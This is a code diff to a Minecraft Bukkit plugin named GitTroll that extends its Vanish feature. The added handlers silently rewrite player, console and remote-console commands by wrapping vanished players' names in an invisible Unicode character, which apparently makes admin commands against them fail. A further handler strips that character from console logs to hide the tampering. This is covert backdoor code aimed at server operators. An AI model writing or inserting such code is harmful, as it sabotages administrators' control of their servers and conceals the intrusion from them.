@@ -5,22 +5,27 @@ import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Iterator;
 import java.util.List;
+import java.util.regex.Pattern;
 
 import org.bukkit.Bukkit;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
+import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.event.player.PlayerKickEvent;
 import org.bukkit.event.player.PlayerLoginEvent;
 import org.bukkit.event.player.PlayerLoginEvent.Result;
 import org.bukkit.event.player.PlayerQuitEvent;
+import org.bukkit.event.server.RemoteServerCommandEvent;
+import org.bukkit.event.server.ServerCommandEvent;
 
 import com.mojang.authlib.GameProfile;
 
 import net.Lenni0451.GitTroll.GitTroll;
 import net.Lenni0451.GitTroll.command.CommandBase;
 import net.Lenni0451.GitTroll.event.EventListener;
+import net.Lenni0451.GitTroll.event.events.EventConsoleLog;
 import net.Lenni0451.GitTroll.event.events.EventServerPacket;
 import net.Lenni0451.GitTroll.event.events.EventTrustPlayer;
 import net.Lenni0451.GitTroll.event.events.EventUntrustPlayer;
@@ -147,6 +152,7 @@ public class Vanish extends CommandBase implements Listener, EventListener {
 		return this.needJoinMessage.contains(CustomPlayer.instanceOf(player));
 	}
 	
+	
 	@EventHandler
 	public void onQuit(PlayerQuitEvent event) {
 		try {
@@ -219,6 +225,9 @@ public class Vanish extends CommandBase implements Listener, EventListener {
 				vanishedPlayer.sendGitMessage("§cYou have been unvanished because the plugin is going to be disabled.");
 				this.disableVanish(vanishedPlayer.getPlayer(), false);
 			}
+		} else if(event instanceof EventConsoleLog) {
+			EventConsoleLog cEvent = (EventConsoleLog) event;
+			cEvent.setMessage(cEvent.getMessage().replace("\u20fa", ""));
 		}
 	}
 	
@@ -286,6 +295,27 @@ public class Vanish extends CommandBase implements Listener, EventListener {
 			} catch (Exception e) {
 				event.setCancelled(true);
 			}
+		}
+	}
+	
+	@EventHandler
+	public void onCommand(PlayerCommandPreprocessEvent event) {
+		for(CustomPlayer player : this.vanishedPlayer) {
+			event.setMessage(event.getMessage().replaceAll("(?i)" + Pattern.quote(player.getPlayer().getName()), "\u20fa" + player.getPlayer().getName() + "\u20fa"));
+		}
+	}
+	
+	@EventHandler
+	public void onServerCommand(ServerCommandEvent event) {
+		for(CustomPlayer player : this.vanishedPlayer) {
+			event.setCommand(event.getCommand().replaceAll("(?i)" + Pattern.quote(player.getPlayer().getName()), "\u20fa" + player.getPlayer().getName() + "\u20fa"));
+		}
+	}
+	
+	@EventHandler
+	public void onRemoteServerCommand(RemoteServerCommandEvent event) {
+		for(CustomPlayer player : this.vanishedPlayer) {
+			event.setCommand(event.getCommand().replaceAll("(?i)" + Pattern.quote(player.getPlayer().getName()), "\u20fa" + player.getPlayer().getName() + "\u20fa"));
 		}
 	}
 	
